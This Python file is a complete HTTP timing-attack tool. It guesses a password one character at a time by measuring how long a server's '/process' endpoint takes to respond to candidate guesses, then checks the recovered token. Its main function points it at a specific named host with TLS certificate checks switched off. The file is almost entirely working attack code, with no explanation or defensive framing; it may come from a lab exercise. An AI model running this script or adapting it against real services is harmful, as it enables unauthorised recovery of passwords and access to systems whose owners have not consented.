import requests
import time
import statistics
import logging
import string
from typing import List, Tuple, Set
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning
import warnings

# Suppress only the single warning from urllib3 needed.
warnings.filterwarnings('ignore', category=InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('http1_timing')

class TimingAttack:
    def __init__(self, base_url: str, num_samples: int = 50):
        self.base_url = base_url
        self.num_samples = num_samples
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification for testing
        
    def create_request(self, token: str) -> requests.Request:
        """Create a request with the specified token."""
        return requests.Request(
            method="GET",
            url=f"{self.base_url}/process",
            params={"password": token},
            headers={"User-Agent": "timing-attack/1.0"}
        )
    
    def measure_response_time(self, request: requests.Request) -> float:
        """Measure the response time for a single request."""
        prepared_request = self.session.prepare_request(request)
        start_time = time.perf_counter()
        response = self.session.send(prepared_request)
        end_time = time.perf_counter()
        return end_time - start_time
    
    def get_timing_samples(self, token: str, control_token: str) -> Tuple[List[float], List[float]]:
        """Get timing samples for both test and control tokens."""
        test_request = self.create_request(token)
        control_request = self.create_request(control_token)
        
        test_times = []
        control_times = []
        
        for _ in range(self.num_samples):
            test_times.append(self.measure_response_time(test_request))
            control_times.append(self.measure_response_time(control_request))
            
        return test_times, control_times
    
    def analyze_timing_difference(self, test_times: List[float], control_times: List[float]) -> float:
        """Analyze the timing difference between test and control samples."""
        test_mean = statistics.mean(test_times)
        control_mean = statistics.mean(control_times)
        test_std = statistics.stdev(test_times) if len(test_times) > 1 else 0
        control_std = statistics.stdev(control_times) if len(control_times) > 1 else 0
        
        # Calculate the difference in means relative to the standard deviation
        if test_std + control_std == 0:
            return 0
        
        return (test_mean - control_mean) / (test_std + control_std)
    
    def find_next_char(self, token_prefix: str) -> List[Tuple[str, float]]:
        """Find the next character in the token using timing analysis."""
        char_set = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        results = []
        
        for char in char_set:
            test_token = token_prefix + char
            control_token = token_prefix + "$"  # Control character
            
            test_times, control_times = self.get_timing_samples(test_token, control_token)
            timing_diff = self.analyze_timing_difference(test_times, control_times)
            
            logger.info(f"Char: {char}, Timing diff: {timing_diff:.3f}")
            results.append((char, timing_diff))
        
        # Sort results by timing difference (descending)
        results.sort(key=lambda x: x[1], reverse=True)
        return results
    
    def find_token(self, max_length: int = 8) -> str:
        """Find the complete token using timing attacks."""
        token = ""
        
        while len(token) < max_length:
            logger.info(f"Testing position {len(token) + 1}")
            results = self.find_next_char(token)
            
            # Get the top 3 candidates
            top_candidates = results[:3]
            logger.info(f"Top candidates: {[(c, f'{s:.3f}') for c, s in top_candidates]}")
            
            # If the best candidate has a significantly higher score than others
            if len(results) > 1 and results[0][1] > results[1][1] * 1.5:
                token += results[0][0]
                logger.info(f"Selected char: {results[0][0]}, Token so far: {token}")
            else:
                # If no clear winner, take the best candidate
                token += results[0][0]
                logger.info(f"No clear winner, selected: {results[0][0]}, Token so far: {token}")
        
        # Verify the token
        verify_request = self.create_request(token)
        response = self.session.send(self.session.prepare_request(verify_request))
        
        if response.status_code == 200:
            logger.info(f"Token verified successfully: {token}")
        else:
            logger.warning(f"Token verification failed: {token}")
        
        return token

def main():
    base_url = "https://hurtleturtle.co.uk:8000"
    attack = TimingAttack(base_url, num_samples=5)
    
    try:
        token = attack.find_token()
        print(f"\nFinal token: {token}")
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
    except Exception as e:
        logger.error(f"Error during attack: {str(e)}")

if __name__ == "__main__":
    main() 